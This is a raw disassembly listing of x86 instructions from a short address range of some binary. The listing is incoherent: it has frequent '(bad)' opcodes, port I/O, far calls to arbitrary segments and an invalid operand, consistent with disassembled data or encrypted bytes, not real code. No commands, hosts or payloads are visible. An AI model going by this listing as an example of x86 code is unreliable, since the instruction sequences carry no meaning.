  41ce7b:	sahf   
  41ce7c:	xchg   BYTE PTR [edx+eiz*1],bh
  41ce7f:	(bad)  
  41ce81:	add    DWORD PTR [esi+ebp*2],edi
  41ce84:	or     BYTE PTR [esi],ah
  41ce86:	imul   ecx,DWORD PTR [ecx-0x78b6a199],0x7f
  41ce8d:	(bad)  
  41ce8e:	mov    ds:0x664201f2,al
  41ce93:	pop    esp
  41ce94:	ror    DWORD PTR [esi-0x6d],cl
  41ce97:	xchg   edi,eax
  41ce98:	cmp    DWORD PTR [ebx-0x69106fb5],0x22b5574a
  41cea2:	adc    eax,0x5f26d331
  41cea7:	aam    0xcf
  41cea9:	stos   DWORD PTR es:[edi],eax
  41ceaa:	xchg   BYTE PTR [eax],bh
  41ceac:	pop    edi
  41cead:	dec    DWORD PTR [edi+0x12]
  41ceb0:	or     BYTE PTR [ebx+0x10],dl
  41ceb3:	mov    eax,ds:0x91147de4
  41ceb8:	pop    ebx
  41ceb9:	out    0xc,eax
  41cebb:	dec    ebx
  41cebc:	push   ss
  41cebd:	cmp    esi,DWORD PTR [edi-0x7b10ec7]
  41cec3:	inc    edx
  41cec4:	adc    eax,0x4fdb6bf1
  41cec9:	mov    al,0x60
  41cecb:	xlat   BYTE PTR ds:[ebx]
  41cecc:	test   DWORD PTR [edx],ecx
  41cece:	mov    dh,0xce
  41ced0:	and    DWORD PTR [esi],edi
  41ced2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ced3:	sub    BYTE PTR [eax-0x47f20761],dl
  41ced9:	das    
  41ceda:	stos   BYTE PTR es:[edi],al
  41cedb:	(bad)  
  41cedc:	mov    eax,0xe1653e4
  41cee1:	stc    
  41cee2:	addr16 ja 0x41ceb9
  41cee5:	mov    cs,WORD PTR [edi]
  41cee7:	cld    
  41cee8:	outs   dx,DWORD PTR ds:[esi]
  41cee9:	addr16 mov ch,0x83
  41ceec:	xor    BYTE PTR [ebp+0x3c],0xb4
  41cef0:	retf   
  41cef1:	mov    ch,0x8e
  41cef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cef4:	mov    dh,0x8e
  41cef6:	xchg   esi,eax
  41cef7:	fiadd  WORD PTR [esi]
  41cef9:	mov    al,0x9e
  41cefb:	cmp    edx,ebp
  41cefd:	ficomp DWORD PTR [edx+0x6a88abaa]
  41cf03:	rcl    BYTE PTR [edx-0x7a],1
  41cf06:	push   ss
  41cf07:	mov    ebx,0x31a02c95
  41cf0c:	jno    0x41cf50
  41cf0e:	xchg   ebp,eax
  41cf0f:	and    dl,BYTE PTR [bx+si+0x4c6a]
  41cf14:	cmp    DWORD PTR [edi],ebp
  41cf16:	loopne 0x41cf4d
  41cf18:	inc    esi
  41cf19:	scas   al,BYTE PTR es:[edi]
  41cf1a:	and    BYTE PTR [esi],0x97
  41cf1d:	jle    0x41ceee
  41cf1f:	sbb    ch,cl
  41cf21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf22:	in     eax,dx
  41cf23:	jae    0x41cec5
  41cf25:	jb     0x41cedb
  41cf27:	retf   0x2ccd
  41cf2a:	fstp   DWORD PTR [edx-0x530a8270]
  41cf30:	dec    ebx
  41cf31:	outs   dx,DWORD PTR ds:[esi]
  41cf32:	add    al,0x4f
  41cf34:	inc    edi
  41cf35:	sbb    esp,ebx
  41cf37:	in     eax,dx
  41cf38:	aad    0x63
  41cf3a:	pop    edi
  41cf3b:	inc    dl
  41cf3d:	cdq    
  41cf3e:	es jb  0x41cf19
  41cf41:	pop    es
  41cf42:	or     DWORD PTR [edx],ecx
  41cf44:	(bad)  
  41cf45:	push   cs
  41cf46:	jle    0x41cf2f
  41cf48:	mov    ah,BYTE PTR [edi+0x53c9bc84]
  41cf4e:	inc    ecx
  41cf4f:	loopne 0x41cf8b
  41cf51:	(bad)  
  41cf52:	xchg   ebx,eax
  41cf53:	nop
  41cf54:	mov    gs,WORD PTR [ebp-0x26b5b0db]
  41cf5a:	(bad)  
  41cf5b:	mov    esp,0x3c9993e9
  41cf60:	add    DWORD PTR [edi+0x108ffe6a],0x2b15bb9f
  41cf6a:	jg     0x41cf15
  41cf6c:	inc    esi
  41cf6d:	dec    ebp
  41cf6e:	jmp    0x4207c04e
  41cf73:	lds    ebx,FWORD PTR [eax-0x61530caa]
  41cf79:	jge    0x41cf31
  41cf7b:	cmp    al,0x38
  41cf7d:	or     DWORD PTR [ecx],eax
  41cf7f:	mov    al,0x7
  41cf81:	sbb    al,0x6
  41cf83:	pop    ss
  41cf84:	std    
  41cf85:	inc    ebx
  41cf86:	leave  
  41cf87:	stos   DWORD PTR es:[di],eax
  41cf89:	nop
  41cf8a:	xchg   esi,eax
  41cf8b:	inc    ecx
  41cf8c:	dec    ebp
  41cf8d:	pop    ecx
  41cf8e:	js     0x41cfbd
  41cf90:	xchg   ebx,eax
  41cf91:	push   0x13
  41cf93:	mov    edx,0x7791d775
  41cf98:	mov    ch,0x50
  41cf9a:	in     al,dx
  41cf9b:	mov    BYTE PTR [ecx+0x51],ch
  41cf9e:	arpl   WORD PTR [esi+0x20],di
  41cfa1:	aad    0x23
  41cfa3:	push   cs
  41cfa4:	jl     0x41cfc9
  41cfa6:	aaa    
  41cfa7:	dec    ebp
  41cfa8:	popa   
  41cfa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfaa:	or     DWORD PTR [ebx-0x46606001],edx
  41cfb0:	test   BYTE PTR [edx+0x5c],0x9a
  41cfb4:	mov    ah,0xda
  41cfb6:	das    
  41cfb7:	ss jl  0x41cf5e
  41cfba:	out    0xb9,eax
  41cfbc:	bound  ecx,QWORD PTR [esi]
  41cfbe:	push   eax
  41cfbf:	push   esp
  41cfc0:	lahf   
  41cfc1:	sbb    al,0xf
  41cfc3:	call   FWORD PTR [ecx+0x3a49904]
  41cfc9:	retf   0xbeb9
  41cfcc:	fdiv   st,st(2)
  41cfce:	mov    cl,0xc4
  41cfd0:	dec    eax
  41cfd1:	jb     0x41cfeb
  41cfd3:	adc    esi,eax
  41cfd5:	data16 and al,0x6f
  41cfd8:	je     0x41cfee
  41cfda:	xlat   BYTE PTR ds:[ebx]
  41cfdb:	retf   0xfe4f
  41cfde:	pop    esp
  41cfdf:	xor    ebp,ecx
  41cfe1:	nop
  41cfe2:	mov    dh,0xa2
  41cfe4:	(bad)  
  41cfe5:	pop    edi
  41cfe6:	pushw  cs
  41cfe8:	ficomp DWORD PTR [esp+eiz*4+0x7e]
  41cfec:	clc    
  41cfed:	mov    dl,0xe8
  41cfef:	sbb    al,0x45
  41cff1:	mov    al,ds:0xcb32e6d1
  41cff6:	js     0x41d066
  41cff8:	gs js  0x41cffc
  41cffb:	jmp    0xac0c3d75
  41d000:	jg     0x41d077
  41d002:	fcom   DWORD PTR [ecx]
  41d004:	jl     0x41cf9e
  41d006:	push   eax
  41d007:	pop    ebx
  41d008:	fisub  DWORD PTR [ebx-0x5a]
  41d00b:	call   0x252:0x44fdf7bc
  41d012:	mov    ecx,0x763222c9
  41d017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d018:	adc    DWORD PTR [ebp+0x75],ebx
  41d01b:	rol    DWORD PTR [eax-0x684893fb],cl
  41d021:	ds out 0xe9,al
  41d024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d025:	push   ecx
  41d026:	add    ah,BYTE PTR [ebx+0x64]
  41d029:	xor    BYTE PTR [edx-0x41],al
  41d02c:	fcmovnu st,st(1)
  41d02e:	pop    esi
  41d02f:	lds    edi,FWORD PTR [edx-0xea183c5]
  41d035:	jb     0x41cfe3
  41d037:	gs jecxz 0x41d070
  41d03a:	sahf   
  41d03b:	xlat   BYTE PTR ds:[ebx]
  41d03c:	inc    ecx
  41d03d:	xor    ebp,DWORD PTR [ecx-0x1e]
  41d040:	push   esi
  41d041:	cmp    al,0x70
  41d043:	(bad)  
  41d044:	dec    ebp
  41d045:	xor    al,0x7c
  41d047:	push   ds
  41d048:	stos   BYTE PTR es:[edi],al
  41d049:	dec    ebx
  41d04a:	dec    esp
  41d04b:	add    eax,0x4ea4aac6
  41d050:	jo     0x41cff8
  41d052:	cmp    ebp,DWORD PTR [eax+0x5e]
  41d055:	sbb    ebp,DWORD PTR [edx-0x2a]
  41d058:	push   ebx
  41d059:	scas   eax,DWORD PTR es:[edi]
  41d05a:	xchg   edi,eax
  41d05b:	dec    bp
  41d05d:	push   ds
  41d05e:	dec    edx
  41d05f:	xor    eax,0x3611d924
  41d064:	sub    ebp,DWORD PTR [ecx-0x32428450]
  41d06a:	scas   al,BYTE PTR es:[edi]
  41d06b:	push   ss
  41d06c:	retf   0x801
  41d06f:	add    al,0x7c
  41d071:	xchg   esp,eax
  41d072:	add    DWORD PTR gs:[edx],0x87a9620b
  41d079:	retf   
  41d07a:	sbb    BYTE PTR [edi],al
  41d07c:	lahf   
  41d07d:	sar    DWORD PTR ds:0xa3a5dfc5,cl
  41d083:	cwde   
  41d084:	lods   al,BYTE PTR ds:[esi]
  41d085:	cmp    dh,bh
  41d087:	jmp    0x41d0f8
  41d089:	mov    edi,0xd2537beb
  41d08e:	sub    BYTE PTR [ecx-0x3d],al
  41d091:	arpl   WORD PTR [edi+0x1c],di
  41d094:	sbb    ebp,0x81a1f631
  41d09a:	es xchg ebp,eax
  41d09c:	xchg   ch,ah
  41d09e:	mov    dh,0xda
  41d0a0:	mov    WORD PTR [ebp+0x58],gs
  41d0a3:	push   ss
  41d0a4:	xor    ecx,DWORD PTR [edi+eiz*1+0x14]
  41d0a8:	push   esi
  41d0a9:	jae    0x41d104
  41d0ab:	xchg   ecx,eax
  41d0ac:	cmp    BYTE PTR [ebx+edx*8-0xe247a2f],dl
  41d0b3:	cmp    bl,BYTE PTR [eax]
  41d0b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0b6:	test   BYTE PTR [edx+0x59],ch
  41d0b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0ba:	stos   BYTE PTR es:[edi],al
  41d0bb:	out    dx,al
  41d0bc:	inc    edx
  41d0bd:	adc    BYTE PTR [ebx+eax*4+0x1d52a502],bh
  41d0c4:	push   edi
  41d0c5:	sti    
  41d0c6:	add    dl,BYTE PTR [edx]
  41d0c8:	push   0xfffffff4
  41d0ca:	fild   QWORD PTR gs:[edx]
  41d0ce:	retf   0xccb5
  41d0d1:	or     eax,0xbebc9467
  41d0d6:	ror    DWORD PTR [eax-0x40],0x5
  41d0da:	leave  
  41d0db:	test   al,0x28
  41d0dd:	xor    edx,DWORD PTR [esi-0x57]
  41d0e0:	call   0xbda3e00c
  41d0e5:	mul    BYTE PTR [edx]
  41d0e7:	sbb    bh,bh
  41d0e9:	sbb    al,0xe4
  41d0eb:	and    eax,0xd97c9254
  41d0f0:	pop    esp
  41d0f1:	mov    esi,0x6d98a80a
  41d0f6:	jae    0x41d163
  41d0f8:	mov    ds:0xf75812d5,eax
  41d0fd:	fs stos BYTE PTR es:[edi],al
  41d0ff:	imul   ecx,DWORD PTR [ebx],0x9bafc5d9
  41d105:	loop   0x41d137
  41d107:	sub    esi,ebx
  41d109:	clc    
  41d10a:	sbb    ebx,DWORD PTR [eax-0x29]
  41d10d:	ret    0xc885
  41d110:	mov    DWORD PTR [esi+esi*1-0x1b],edx
  41d114:	int3   
  41d115:	add    esi,DWORD PTR [edx]
  41d117:	mov    al,0xc5
  41d119:	push   ss
  41d11a:	ret    0x4857
  41d11d:	retf   0x9433
  41d120:	scas   eax,DWORD PTR es:[edi]
  41d121:	mov    dl,0x19
  41d123:	adc    al,0x94
  41d125:	mov    ds:0xece703b8,al
  41d12a:	aas    
  41d12b:	xchg   edi,eax
  41d12c:	mov    ch,0x50
  41d12e:	repz loopne 0x41d183
  41d131:	mov    al,0x55
  41d133:	inc    ebx
  41d134:	dec    edx
  41d135:	xchg   edx,eax
  41d136:	and    bh,BYTE PTR [eax-0x80]
  41d139:	jmp    0x41d102
  41d13b:	sbb    bh,BYTE PTR [esi-0x1a37222f]
  41d141:	sub    eax,0xf3bdc04f
  41d146:	(bad)  
  41d148:	xor    al,0x8e
  41d14a:	mov    al,ds:0xa44e92cb
  41d14f:	and    al,BYTE PTR ds:0x8731e634
  41d155:	ss jo  0x41d1c0
  41d158:	sub    al,0x66
  41d15a:	mov    bh,0xfa
  41d15c:	and    BYTE PTR [eax-0x6e],dl
  41d15f:	add    ebx,DWORD PTR [esi]
  41d161:	jmp    0x41d145
  41d163:	ins    DWORD PTR es:[edi],dx
  41d164:	adc    eax,0x1c06e4ae
  41d169:	cli    
  41d16a:	aas    
  41d16b:	jbe    0x41d190
  41d16d:	mov    bl,0xcc
  41d16f:	xlat   BYTE PTR ds:[ebx]
  41d170:	push   ebx
  41d171:	in     al,dx
  41d172:	leave  
  41d173:	sbb    ah,BYTE PTR [edi]
  41d175:	sub    eax,0xd25f1f75
  41d17a:	pop    edi
  41d17b:	(bad)  
  41d17c:	dec    esi
  41d17d:	pop    ecx
  41d17e:	icebp  
  41d17f:	nop
  41d180:	sub    eax,0xdc70fe16
  41d185:	or     eax,0x73a5e4aa
  41d18a:	test   eax,0x38a3dbce
  41d18f:	hlt    
  41d190:	mov    esp,0x7eb0bbdd
  41d195:	dec    ecx
  41d196:	xchg   edi,eax
  41d197:	jl     0x41d195
  41d199:	dec    ebx
  41d19a:	jno    0x41d217
  41d19c:	add    esp,DWORD PTR [esi]
  41d19e:	or     BYTE PTR [ecx+ebp*4-0xe],bh
  41d1a2:	xchg   esi,eax
  41d1a3:	imul   ecx,DWORD PTR [edi],0x2fcb3665
  41d1a9:	xlat   BYTE PTR ds:[ebx]
  41d1aa:	out    dx,al
  41d1ab:	xor    dh,BYTE PTR [edi]
  41d1ad:	inc    eax
  41d1ae:	cs push eax
  41d1b0:	call   0x2edb:0x2f6a3291
  41d1b7:	xor    BYTE PTR [ebp-0x60d4f43f],al
  41d1bd:	int3   
  41d1be:	imul   eax,DWORD PTR [ecx],0x6615ad8
  41d1c4:	in     al,0x4c
  41d1c6:	cmp    cl,bh
  41d1c8:	jae    0x41d245
  41d1ca:	cli    
  41d1cb:	out    dx,eax
  41d1cc:	pop    es
  41d1cd:	jns    0x41d1ff
  41d1cf:	ret    0x9fc2
  41d1d2:	cmp    DWORD PTR [ebp-0x67fa1e6],ebx
  41d1d8:	shl    DWORD PTR [ebx-0x5e9cd2ab],cl
  41d1de:	mov    fs,ecx
  41d1e0:	leave  
  41d1e1:	jb     0x41d20f
  41d1e3:	test   DWORD PTR [edx+0x15],esp
  41d1e6:	call   0xa0cb:0xb1acf1e0
  41d1ed:	mul    esi
  41d1ef:	cld    
  41d1f0:	iret   
  41d1f1:	jo     0x41d24b
  41d1f3:	pushf  
  41d1f4:	lahf   
  41d1f5:	loopne 0x41d256
  41d1f7:	(bad)  
  41d1f9:	sti    
  41d1fa:	test   DWORD PTR [ecx],ebp
  41d1fc:	push   0x29
  41d1fe:	dec    esi
  41d1ff:	fstp   TBYTE PTR [edx]
  41d201:	shl    DWORD PTR [edi+0x3e4521a3],1
  41d207:	mov    al,ds:0xdaf48f4a
  41d20c:	mov    al,0xba
  41d20e:	cmp    DWORD PTR [esi-0xe85a40d],esp
  41d214:	lahf   
  41d215:	out    0x72,al
  41d217:	imul   ebx,DWORD PTR [eax+0xc],0x267b2543
  41d21e:	sub    dh,ch
  41d220:	and    eax,0x1ddaf9a9
  41d225:	repnz in al,0x3d
  41d228:	adc    dh,ah
  41d22a:	jge    0x41d2ab
  41d22c:	cmp    eax,0x9d241169
  41d231:	jo     0x41d24c
  41d233:	pop    ecx
  41d234:	sub    BYTE PTR [edi],0x44
  41d237:	jnp    0x41d238
  41d239:	dec    edi
  41d23a:	fld    st(4)
  41d23c:	dec    ebp
  41d23d:	mov    ebp,0x98abcd96
  41d242:	cmc    
  41d243:	mov    edx,DWORD PTR ds:0xc0d95bc9
  41d249:	call   0xe8b9:0x9e445c99
  41d250:	push   edx
  41d251:	mov    ds:0x7a4e20e4,al
  41d256:	and    eax,0xc9adeb7c
  41d25b:	pushf  
  41d25c:	seto   ch
  41d25f:	xchg   esp,eax
  41d260:	retf   
  41d261:	add    ecx,DWORD PTR [eax+0x113a6eb1]
  41d267:	dec    eax
  41d268:	scas   al,BYTE PTR es:[edi]
  41d269:	jne    0x41d210
  41d26b:	add    al,0x68
  41d26d:	xchg   ebp,eax
  41d26e:	mov    eax,0x79f6e85d
  41d273:	pop    ss
  41d274:	pop    eax
  41d275:	fs cmp esi,0x97379d46
  41d27c:	cmp    DWORD PTR [eax],edi
  41d27e:	jmp    0x41d233
  41d280:	bound  ecx,QWORD PTR [edi]
  41d282:	lahf   
  41d283:	jmp    0xe356a09f
  41d288:	jb     0x41d2b6
  41d28a:	aam    0x86
  41d28c:	or     eax,0xa7d51b23
  41d291:	popf   
  41d292:	jo     0x41d21a
  41d294:	adc    al,BYTE PTR [edx+0x62]
  41d297:	inc    esp
  41d298:	mov    al,0x5e
  41d29a:	xor    DWORD PTR [esi],ebx
  41d29c:	test   eax,0x7833241c
  41d2a1:	iret   
  41d2a2:	cmp    eax,0xcbb2d565
  41d2a7:	shl    ebp,1
  41d2a9:	pushf  
  41d2aa:	call   0x409d:0xff0f88a2
  41d2b1:	xor    BYTE PTR [edi],0x65
  41d2b4:	mov    esp,0x9fe09fb4
  41d2b9:	arpl   WORD PTR [esi+esi*2+0x67],si
  41d2bd:	aam    0x1c
  41d2bf:	(bad)  
  41d2c0:	int3   
  41d2c1:	es dec edi
  41d2c3:	jno    0x41d334
  41d2c5:	lahf   
  41d2c6:	push   ss
  41d2c7:	mov    eax,0x14478a1e
  41d2cc:	add    BYTE PTR [edi-0x7ef49607],bl
  41d2d2:	retf   0x891e
  41d2d5:	sub    DWORD PTR [edx-0x5c],eax
  41d2d8:	inc    edi
  41d2d9:	repnz int3 
  41d2db:	and    BYTE PTR [ebx+0x65],dh
  41d2de:	sub    DWORD PTR [eax+0x55aa8580],esi
  41d2e4:	mov    esp,DWORD PTR [edx-0x4a]
  41d2e7:	popa   
  41d2e8:	(bad)  
  41d2e9:	sar    DWORD PTR [eax+0x63fb572c],cl
  41d2ef:	mov    BYTE PTR [ebp+0x50beea1f],bh
  41d2f5:	test   BYTE PTR [eax+0x3372de15],al
  41d2fb:	xor    al,0xdc
  41d2fd:	std    
  41d2fe:	push   es
  41d2ff:	jno    0x41d2be
  41d301:	call   0x1979:0xb2c04cff
  41d308:	ss jo  0x41d2e0
  41d30b:	dec    esi
  41d30c:	push   es
  41d30d:	xlat   BYTE PTR ds:[ebx]
  41d30e:	push   es
  41d30f:	jmp    0x7b17445a
  41d314:	pop    edi
  41d315:	jb     0x41d371
  41d317:	test   eax,0x3ade9fa1
  41d31c:	sbb    al,0xb
  41d31e:	mov    eax,ds:0xa03dd9c8
  41d323:	and    ebx,DWORD PTR [edi+ebx*2-0x70]
  41d327:	mov    dh,0xef
  41d329:	cmp    eax,0xde5fa948
  41d32e:	xor    DWORD PTR [eax+ebx*2+0x730ee0ca],ebx
  41d335:	shl    DWORD PTR [edx],cl
  41d337:	retf   0x26dd
  41d33a:	cmp    esp,DWORD PTR gs:[edi]
  41d33d:	in     eax,dx
  41d33e:	fisubr WORD PTR [ecx+edx*1-0x2bb9819a]
  41d345:	mov    ds:0x6489b73e,al
  41d34a:	xchg   BYTE PTR [ecx],bl
  41d34c:	dec    ebx
  41d34d:	js     0x41d361
  41d34f:	xor    BYTE PTR [ecx],0x98
  41d352:	loopne 0x41d347
  41d354:	inc    ebx
  41d355:	arpl   WORD PTR fs:0x9b1b5f21,si
  41d35c:	push   0xffffffa2
  41d35e:	(bad)  
  41d35f:	and    eax,0x9db84882
  41d364:	popf   
  41d365:	add    edx,0x7857bc3b
  41d36b:	add    bh,cl
  41d36d:	mov    BYTE PTR [esi-0x8fed100],dl
  41d373:	jbe    0x41d341
  41d375:	push   esi
  41d376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d377:	dec    edi
  41d378:	cs mov edi,0xa64b5cee
  41d37e:	loopne 0x41d3ab
  41d380:	aaa    
  41d381:	out    0xda,al
  41d383:	daa    
  41d384:	inc    ebp
  41d385:	mov    ecx,0xad7137f1
  41d38a:	sub    BYTE PTR [eax],0x53
  41d38d:	push   cs
  41d38e:	std    
  41d38f:	(bad)  
  41d391:	(bad)
  41d395:	mov    eax,DWORD PTR [eax+0x2c]
  41d398:	bound  ebp,QWORD PTR [eax+0x22ce664c]
  41d39e:	mov    bh,0xbd
  41d3a0:	add    ah,BYTE PTR [ebx-0x6f14e343]
  41d3a6:	xchg   dh,bh
  41d3a8:	mov    cl,0xc0
  41d3aa:	xlat   BYTE PTR ds:[ebx]
  41d3ab:	js     0x41d399
  41d3ad:	repnz outs dx,BYTE PTR ds:[esi]
  41d3af:	ret    0x98d9
  41d3b2:	sub    ebp,DWORD PTR [edx]
  41d3b4:	or     eax,0x21956cad
  41d3b9:	push   0x506ea56c
  41d3be:	and    al,0x76
  41d3c0:	fiadd  DWORD PTR [ecx+0x2cb8200e]
  41d3c6:	mov    cl,0x4b
  41d3c8:	mov    edi,0xeb697f91
  41d3cd:	and    al,0xfe
  41d3cf:	retf   0x928a
  41d3d2:	sub    BYTE PTR [ebp+0x35],0xb6
  41d3d6:	shl    DWORD PTR [eax],0x65
  41d3d9:	cs fcomp st(6)
  41d3dc:	in     al,0x1a
  41d3de:	push   esp
  41d3df:	(bad)  
  41d3e0:	into   
  41d3e1:	aam    0x31
  41d3e3:	cmp    esi,DWORD PTR [esi+0x53ab0bbd]
  41d3e9:	sub    eax,0x99d94c45
  41d3ee:	jae    0x41d380
  41d3f0:	adc    BYTE PTR [edi],cl
  41d3f2:	pusha  
  41d3f3:	push   ebp
  41d3f4:	mov    dl,0x39
  41d3f6:	(bad)  
  41d3f7:	repnz cdq 
  41d3f9:	push   0xffffffa2
  41d3fb:	and    DWORD PTR [edx-0x160c3afd],0xc6362a05
  41d405:	cmc    
  41d406:	clc    
  41d407:	fidivr DWORD PTR [ebx+0x2c1517ba]
  41d40d:	stos   DWORD PTR es:[edi],eax
  41d40e:	cdq    
  41d40f:	rcl    BYTE PTR [eax+ebx*2],0xf7
  41d413:	mov    al,ds:0x1dc6892f
  41d418:	ret    
  41d419:	pop    ebx
  41d41a:	loop   0x41d497
  41d41c:	inc    ecx
  41d41d:	addr16 inc eax
  41d41f:	ins    BYTE PTR es:[edi],dx
  41d420:	mov    ds,edi
  41d422:	(bad)  
  41d423:	loope  0x41d3bc
  41d425:	sbb    BYTE PTR [esi+0x53f019f4],al
  41d42b:	xchg   ebx,eax
  41d42c:	fwait
  41d42d:	(bad)  
  41d42e:	fcom   st(1)
  41d430:	sbb    ch,bl
  41d432:	pop    ebp
  41d433:	pop    ds
  41d434:	inc    eax
  41d435:	inc    esp
  41d436:	add    eax,0x74e85b8f
  41d43b:	popf   
  41d43c:	gs lahf 
  41d43e:	adc    BYTE PTR [eax-0x54255839],ch
  41d444:	jne    0x41d418
  41d446:	sbb    al,0x6b
  41d448:	mov    ?,WORD PTR gs:[ecx+0x3a]
  41d44c:	imul   sp,WORD PTR [ebx],0xffbf
  41d450:	sub    DWORD PTR [esi+0x2ce6b29c],ebx
  41d456:	push   edx
  41d457:	hlt    
  41d458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d459:	push   es
  41d45a:	add    al,0x9b
  41d45c:	sbb    ch,BYTE PTR [edx]
  41d45e:	mov    eax,0xb68f09ba
  41d463:	xor    ebp,ecx
  41d465:	add    eax,0x1a10a536
  41d46a:	xor    al,0x9b
  41d46c:	jl     0x41d4aa
  41d46e:	lds    esi,FWORD PTR [ecx]
  41d470:	adc    al,0xf2
  41d472:	inc    esp
  41d473:	add    BYTE PTR [ecx+edx*8],0x9c
  41d477:	stos   BYTE PTR es:[edi],al
  41d478:	ja     0x41d4e2
  41d47a:	sub    al,bh
  41d47c:	in     al,dx
  41d47d:	adc    DWORD PTR [esi],0xffffffdf
  41d480:	push   0x1cdf2144
  41d485:	popa   
  41d486:	pusha  
  41d487:	das    
  41d488:	stos   BYTE PTR es:[edi],al
  41d489:	adc    edi,0xc640e9d1
  41d48f:	repnz mov eax,0x78606cca
  41d495:	ror    BYTE PTR [edi+edx*1+0x3d],0x6a
  41d49a:	in     al,dx
  41d49b:	outs   dx,BYTE PTR ds:[esi]
  41d49c:	lea    esp,[ebx+0x16738ab6]
  41d4a2:	test   DWORD PTR [esi],0xaeb40a9
  41d4a8:	xor    edx,DWORD PTR [ebp-0x4e46b532]
  41d4ae:	lds    edi,FWORD PTR [ecx-0x62]
  41d4b1:	ins    DWORD PTR es:[edi],dx
  41d4b2:	adc    BYTE PTR [esi+ebp*2],dh
  41d4b5:	nop
  41d4b6:	mov    ch,0xd0
  41d4b8:	and    edx,DWORD PTR [edi]
  41d4ba:	in     eax,dx
  41d4bb:	or     edi,ebp
  41d4bd:	into   
  41d4be:	hlt    
  41d4bf:	js     0x41d493
  41d4c1:	fcom   QWORD PTR gs:[ebx-0x1000a58d]
  41d4c8:	js     0x41d4a6
  41d4ca:	pop    ds
  41d4cb:	repz xchg edi,eax
  41d4cd:	push   0xffffff81
  41d4cf:	push   esp
  41d4d0:	xchg   DWORD PTR [edi],edx
  41d4d2:	jnp    0x41d457
  41d4d4:	shl    ch,0x73
  41d4d7:	lea    eax,[esi+0x79]
  41d4da:	sub    edi,DWORD PTR [edi-0x1e]
  41d4dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4df:	repz inc esi
  41d4e1:	sub    BYTE PTR [ebx+0x52],cl
  41d4e4:	rol    DWORD PTR [eax+0x26c13986],cl
  41d4ea:	inc    eax
  41d4eb:	loop   0x41d561
  41d4ed:	loope  0x41d526
  41d4ef:	inc    ecx
  41d4f0:	fdivr  QWORD PTR [ecx]
  41d4f2:	inc    esp
  41d4f3:	ss xor eax,0x5b622890
  41d4f9:	inc    ebx
  41d4fa:	fldenv [ecx+0x34351ab4]
  41d500:	(bad)  
  41d501:	lahf   
  41d502:	out    0xb8,eax
  41d504:	int    0x23
  41d506:	imul   ebp,DWORD PTR [edi],0xffffffb7
  41d509:	aas    
  41d50a:	mov    dh,0x53
  41d50c:	push   edi
  41d50d:	pop    es
  41d50e:	fldenv [ebp+0x4f64c500]
  41d514:	(bad)  
  41d515:	cmc    
  41d516:	ret    0xb00f
  41d519:	inc    esp
  41d51a:	retf   
  41d51b:	xor    al,BYTE PTR [esi+0x6b8705ca]
  41d521:	xchg   ecx,eax
  41d522:	sub    al,0xe1
  41d524:	lea    edi,[edx+0x18]
  41d527:	jae    0x41d502
  41d529:	loopne 0x41d514
  41d52b:	cdq    
  41d52c:	dec    edi
  41d52d:	add    esp,DWORD PTR [ecx]
  41d52f:	mov    al,ds:0x115f3009
  41d534:	sub    ch,BYTE PTR [ebx+0x40]
  41d537:	mov    ecx,0x77930bec
  41d53c:	(bad)  
  41d53d:	xchg   esi,eax
  41d53e:	push   ss
  41d53f:	pop    ebx
  41d540:	ffreep st(5)
  41d542:	lock out 0xe1,eax
  41d545:	mov    bh,0xcf
  41d547:	xor    esp,DWORD PTR [ecx+edx*1]
  41d54a:	neg    BYTE PTR [ebx+0x4880891c]
  41d550:	imul   esp,DWORD PTR [eax],0xffffffea
  41d553:	ins    DWORD PTR es:[edi],dx
  41d554:	lahf   
  41d555:	repnz stos DWORD PTR es:[edi],eax
  41d557:	pushf  
  41d558:	fsubr  DWORD PTR [eax+0x7d]
  41d55b:	dec    ebp
  41d55c:	enter  0x119b,0x7c
  41d560:	cs loope 0x41d5a7
  41d563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d564:	push   esi
  41d565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d566:	stos   DWORD PTR es:[edi],eax
  41d567:	jo     0x41d56f
  41d569:	shl    BYTE PTR [edi-0x3],cl
  41d56c:	stos   DWORD PTR es:[edi],eax
  41d56d:	test   BYTE PTR [eax+0x545c2b00],dl
  41d573:	push   ss
  41d574:	push   ecx
  41d575:	stos   BYTE PTR es:[edi],al
  41d576:	sub    bl,BYTE PTR [esi-0x55b58e8]
  41d57c:	lahf   
  41d57d:	in     eax,0x74
  41d57f:	ret    
  41d580:	sahf   
  41d581:	inc    ecx
  41d582:	into   
  41d583:	rcl    bl,1
  41d585:	and    cl,BYTE PTR [esi]
  41d587:	stos   BYTE PTR es:[edi],al
  41d588:	(bad)  
  41d589:	(bad)  
  41d58a:	pop    ebp
  41d58b:	xlat   BYTE PTR ds:[ebx]
  41d58c:	outs   dx,DWORD PTR ds:[esi]
  41d58d:	mov    bh,BYTE PTR [ecx+0x1b81bf92]
  41d593:	mov    ah,0xee
  41d595:	xor    al,0x9c
  41d597:	jp     0x41d53e
  41d599:	mov    ch,0x6c
  41d59b:	sub    BYTE PTR [esi-0x11],ch
  41d59e:	xor    DWORD PTR [eax+0xf],eax
  41d5a1:	fs push ss
  41d5a3:	cmc    
  41d5a4:	jns    0x41d5a2
  41d5a6:	dec    ebp
  41d5a7:	xor    al,0xc4
  41d5a9:	mul    DWORD PTR [edi]
  41d5ab:	adc    al,0xe7
  41d5ad:	ror    DWORD PTR [eax],1
  41d5af:	xchg   ebp,eax
  41d5b0:	mov    dl,0xfe
  41d5b2:	inc    esp
  41d5b3:	scas   eax,DWORD PTR es:[edi]
  41d5b4:	inc    ebp
  41d5b5:	push   eax
  41d5b6:	sti    
  41d5b7:	aam    0x3a
  41d5b9:	mov    esi,0x91b09bd1
  41d5be:	mov    bh,0x1c
  41d5c0:	(bad)  
  41d5c1:	out    dx,al
